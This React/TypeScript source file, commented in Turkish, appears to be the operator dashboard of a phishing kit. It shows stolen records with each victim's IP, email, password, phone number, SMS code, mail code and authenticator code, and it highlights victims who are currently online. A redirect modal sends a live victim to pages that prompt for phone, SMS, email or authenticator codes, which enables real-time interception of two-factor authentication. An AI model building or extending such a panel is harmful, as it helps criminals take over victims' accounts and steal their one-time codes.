'use client'

import React, { useState } from 'react'
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table'
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog'
import { Input } from '@/components/ui/input'
import { Button } from '@/components/ui/button'
import { Search, Loader2, Trash2, RefreshCw, UserCircle2 } from 'lucide-react'

interface Record {
  _id: string;
  ipAddress: string;
  username: string;
  password: string;
  phone: string;
  phone_sms: string;
  mail_sms: string;
  auth: string;
  hotmail: string;
  createdAt: string;
}

interface UserTableProps {
  data: Record[];
  activeIPs?: string[]; // Aktif IP'ler
  activeCount?: number; // Aktif kullanıcı sayısı
  onDelete: (id: string) => void;
  onRefresh?: () => void; // Yenileme için opsiyonel callback fonksiyonu
}

const UserTable = ({ data, activeIPs = [], activeCount = 0, onDelete, onRefresh }: UserTableProps) => {
  const [searchTerm, setSearchTerm] = useState('')
  const [modalOpen, setModalOpen] = useState(false)
  const [selectedIP, setSelectedIP] = useState('')
  const [isDeleting, setIsDeleting] = useState(false)
  const [redirectPage, setRedirectPage] = useState('/wait')
  const [isRedirecting, setIsRedirecting] = useState(false)
  const [isRefreshing, setIsRefreshing] = useState(false) // Manuel yenileme durumunu izlemek için

  // IP'nin aktif olup olmadığını kontrol et
  const isIPActive = (ip: string): boolean => {
    return activeIPs.includes(ip);
  };

  // Manuel yenileme fonksiyonu
  const handleRefresh = async () => {
    if (!onRefresh || isRefreshing) return;
    
    setIsRefreshing(true);
    await onRefresh();
    
    // Animasyonu biraz daha göstermek için timeout kullanıyoruz
    setTimeout(() => {
      setIsRefreshing(false);
    }, 500);
  };

  // Yönlendirme işlemi
  const handleRedirect = async (page?: string) => {
    try {
      setIsRedirecting(true);
      
      // Eğer sayfa parametresi verilmişse, state güncelle
      if (page) {
        setRedirectPage(page);
      }
      
      // Hangi sayfayı kullanacağımıza karar ver
      const targetPage = page || redirectPage;
      
      const response = await fetch('/api/redirect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          ipAddress: selectedIP,
          page: targetPage
        })
      });

      const data = await response.json();
      
      if (data.success) {
        // Kullanıcıya bildirim göster, ama alert'i kaldırdık
        // Modal'ı başarılı yönlendirmeden sonra kapat
        setTimeout(() => {
          setModalOpen(false);
        }, 800); // 800ms bekleme süresi
      } else {
        alert('Yönlendirme hatası: ' + data.message);
      }
    } catch (error) {
      console.error('Yönlendirme hatası:', error);
      alert('Yönlendirme yapılırken bir hata oluştu');
    } finally {
      setTimeout(() => {
        setIsRedirecting(false);
      }, 500); // Animasyonun bitmesi için biraz bekle
    }
  };

  // Tüm kayıtları silme işlemi
  const handleDeleteAll = async () => {
    if (confirm('Tüm kayıtları silmek istediğinize emin misiniz?')) {
      try {
        setIsDeleting(true);
        const response = await fetch('/api/delete', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          }
        });

        const result = await response.json();
        
        if (result.success) {
          alert(result.message);
          // Sayfayı yenileme
          window.location.reload();
        } else {
          alert('Silme hatası: ' + result.message);
        }
      } catch (error) {
        console.error('Toplu silme hatası:', error);
        alert('Kayıtlar silinirken bir hata oluştu');
      } finally {
        setIsDeleting(false);
      }
    }
  };

  const handleOpenModal = (ipAddress: string) => {
    setSelectedIP(ipAddress)
    setRedirectPage('/wait') // Varsayılan değeri sıfırla
    setModalOpen(true)
  }

  const filteredRecords = data.filter((record) =>
    Object.values(record).some((value) =>
      value?.toString().toLowerCase().includes(searchTerm.toLowerCase())
    )
  )

  return (
    <div className="space-y-4 p-4">
      <div className="flex justify-between items-center">
        <div className="relative flex gap-2">
          <div className="relative">
            <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
            <Input
              placeholder="log ara..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="pl-8 w-[300px]"
            />
          </div>
          
          {onRefresh && (
            <Button
              variant="outline"
              size="icon"
              onClick={handleRefresh}
              disabled={isRefreshing}
              className="flex-shrink-0"
              title="Verileri Yenile"
            >
              <RefreshCw className={`h-4 w-4 ${isRefreshing ? 'animate-spin' : ''}`} />
            </Button>
          )}
        </div>
        
        <div className="flex items-center gap-2">
          <div className="flex gap-2">
            <div className="px-3 py-1 rounded-full bg-green-500 text-white">
              {data.length} Kayıt
            </div>
            
            {activeCount > 0 && (
              <div className="px-3 py-1 rounded-full bg-blue-500 text-white flex items-center gap-1">
                <UserCircle2 className="h-3.5 w-3.5" />
                {activeCount} Aktif
              </div>
            )}
          </div>
          
          <Button
            variant="destructive"
            onClick={handleDeleteAll}
            disabled={isDeleting}
          >
            {isDeleting ? (
              <div className="flex items-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" /> Siliniyor...
              </div>
            ) : (
              'Tüm Kayıtları Sil'
            )}
          </Button>
        </div>
      </div>

      <div className="rounded-md border">
        <Table>
          <TableHeader>
            <TableRow>
              <TableHead>IP</TableHead>
              <TableHead>E-posta</TableHead>
              <TableHead>Şifre</TableHead>
              <TableHead>Telefon</TableHead>
              <TableHead>SMS Kod</TableHead>
              <TableHead>Mail Kod</TableHead>
              <TableHead>Auth Kod</TableHead>
              <TableHead>İşlemler</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredRecords.length > 0 ? (
              filteredRecords.map((record) => {
                const isActive = isIPActive(record.ipAddress);
                return (
                  <TableRow 
                    key={record._id}
                    className={isActive ? 'bg-green-200' : ''}
                  >
                    <TableCell>
                      <div className="flex items-center gap-1">
                        {isActive && (
                          <span className="w-2 h-2 rounded-full bg-green-500" title="Aktif Kullanıcı"></span>
                        )}
                        {record.ipAddress}
                      </div>
                    </TableCell>
                    <TableCell>{record.username || '-'}</TableCell>
                    <TableCell>{record.password || '-'}</TableCell>
                    <TableCell>{record.phone || '-'}</TableCell>
                    <TableCell>{record.phone_sms || '-'}</TableCell>
                    <TableCell>{record.mail_sms || '-'}</TableCell>
                    <TableCell>{record.auth || '-'}</TableCell>
                    <TableCell>
                      <div className="flex space-x-2">
                        <Button
                          variant="outline"
                          onClick={() => handleOpenModal(record.ipAddress)}
                          className={`h-8 p-1 px-2 ${isActive ? 'border-green-500 text-green-600' : ''}`}
                          title="Yönlendir"
                        >
                          <span className="text-xs">Yönlendir</span>
                        </Button>
                        <Button
                          variant="ghost"
                          onClick={() => onDelete(record._id)}
                          className="h-8 w-8 p-0 text-red-500 hover:text-red-700"
                          title="Sil"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                );
              })
            ) : (
              <TableRow>
                <TableCell colSpan={8} className="text-center py-4">
                  Kayıt bulunamadı
                </TableCell>
              </TableRow>
            )}
          </TableBody>
        </Table>
      </div>

      {/* Yönlendirme Modal */}
      <Dialog open={modalOpen} onOpenChange={setModalOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Kullanıcıyı Yönlendir</DialogTitle>
          </DialogHeader>
          <div className="grid py-4">
            <p className="font-medium mb-2">IP: {selectedIP}</p>
            
            <div className="grid grid-cols-2 gap-2">
              <Button 
                variant="outline" 
                className={redirectPage === '/' ? 'bg-yellow-100 border-yellow-400' : ''}
                onClick={() => handleRedirect('/')}
                disabled={isRedirecting}
              >
                Ana Sayfa
                {isRedirecting && redirectPage === '/' && <Loader2 className="ml-2 h-4 w-4 animate-spin" />}
              </Button>
              
              <Button 
                variant="outline" 
                className={redirectPage === '/wait' ? 'bg-blue-100 border-blue-400' : ''}
                onClick={() => handleRedirect('/wait')}
                disabled={isRedirecting}
              >
                Bekleme
                {isRedirecting && redirectPage === '/wait' && <Loader2 className="ml-2 h-4 w-4 animate-spin" />}
              </Button>
              
              <Button 
                variant="outline" 
                className={redirectPage === '/phone' ? 'bg-blue-100 border-blue-400' : ''}
                onClick={() => handleRedirect('/phone')}
                disabled={isRedirecting}
              >
                Telefon
                {isRedirecting && redirectPage === '/phone' && <Loader2 className="ml-2 h-4 w-4 animate-spin" />}
              </Button>
              
              <Button 
                variant="outline" 
                className={redirectPage === '/sms' ? 'bg-blue-100 border-blue-400' : ''}
                onClick={() => handleRedirect('/sms')}
                disabled={isRedirecting}
              >
                SMS
                {isRedirecting && redirectPage === '/sms' && <Loader2 className="ml-2 h-4 w-4 animate-spin" />}
              </Button>
              
              <Button 
                variant="outline" 
                className={redirectPage === '/mail-kod' ? 'bg-blue-100 border-blue-400' : ''}
                onClick={() => handleRedirect('/mail-kod')}
                disabled={isRedirecting}
              >
                Mail Kod
                {isRedirecting && redirectPage === '/mail-kod' && <Loader2 className="ml-2 h-4 w-4 animate-spin" />}
              </Button>
              
              <Button 
                variant="outline" 
                className={redirectPage === '/auth' ? 'bg-blue-100 border-blue-400' : ''}
                onClick={() => handleRedirect('/auth')}
                disabled={isRedirecting}
              >
                Authenticator
                {isRedirecting && redirectPage === '/auth' && <Loader2 className="ml-2 h-4 w-4 animate-spin" />}
              </Button>
              
           
              
           {/*    <Button 
                variant="outline" 
                className={redirectPage === '/complete' ? 'bg-green-100 border-green-400' : ''}
                onClick={() => handleRedirect('/complete')}
                disabled={isRedirecting}
              >
                Tamamlandı
                {isRedirecting && redirectPage === '/complete' && <Loader2 className="ml-2 h-4 w-4 animate-spin" />}
              </Button> */}
            </div>
            
            {isRedirecting && (
              <p className="text-sm text-gray-500 mt-4 text-center">
                Yönlendirme işlemi yapılıyor...
              </p>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}

export default UserTable